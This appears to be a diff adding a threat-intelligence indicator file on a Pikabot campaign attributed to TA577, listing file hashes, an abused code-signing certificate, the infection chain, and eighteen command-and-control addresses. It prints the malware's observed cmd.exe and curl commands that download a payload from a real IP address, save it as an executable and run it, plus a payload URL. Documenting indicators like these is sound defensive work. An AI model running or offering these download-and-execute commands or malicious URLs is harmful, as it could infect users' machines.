@@ -1,0 +1,83 @@
+22.02.2024 | Pikabot | TA577 | 1.8.32-beta
+
+*************************************************
+
+.zip 4c29552b5fcd20e5ed8ec72dd345f2ea573e65412b65c99d897761d97c35ebfd
+.exe 89dc50024836f9ad406504a3b7445d284e97ec5dafdd8f2741f496cac84ccda9
+
+*************************************************
+
+Code Signing Certificate
+Organisation:	A.P.Hernandez Consulting s.r.o.
+Issuer:	SSL.com EV Code Signing Intermediate CA RSA R3
+Algorithm:	sha256WithRSAEncryption
+Valid from:	2024-01-25T16:51:40Z
+Valid to:	2025-01-24T16:51:40Z
+Serial number:	 2941d5f8758501f9dbc4ba158058c3b5
+Thumbprint Algorithm:	SHA256
+Thumbprint:	 a982917ba6de9588f0f7ed554223d292524e832c1621acae9ad11c0573df54a5
+
+*************************************************
+
+url > zip > smb > .exe
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\RATIONEVC.js
+
+cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl http://103.124.105.147/KNaDVX/0.3733734479965182.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+curl  http://103.124.105.147/KNaDVX/0.3733734479965182.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.4603378569149517.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+curl  0.4603378569149517.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.4168150928589275.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+curl 0.4168150928589275.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.7876609490027446.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+curl 0.7876609490027446.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.2609532278070895.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+curl  0.2609532278070895.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+cmd.exe /c mkdir  C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh & curl 0.8415582198813714.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+curl  0.8415582198813714.dat --output C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+cmd.exe /c timeout 11 & C:\Dthfgjhjfj\Rkfjsil\Ejkjhdgjf\Byfjgkgdfh\Ngjhjhjda.exe
+
+timeout  11 
+
+*************************************************
+
+.dll distro
+
+http://103.124.105.147/KNaDVX/0.3733734479965182.dat
+
+*************************************************
+
+c2's
+
+https://141.95.106.106:2967
+https://198.44.187.12:2224
+https://104.129.55.106:13783
+https://154.12.233.66:2224
+https://104.129.55.105:2223
+https://37.60.242.85:9785
+https://23.226.138.161:5242
+https://145.239.135.24:5243
+https://86.38.225.105:13721
+https://85.239.243.155:5000
+https://89.117.23.186:5632
+https://23.226.138.143:2083
+https://103.82.243.5:13785
+https://89.117.23.185:2221
+https://86.38.225.106:2221
+https://57.128.165.176:13721
+https://178.18.246.136:2078
+https://154.12.248.41:5000
+
+*************************************************
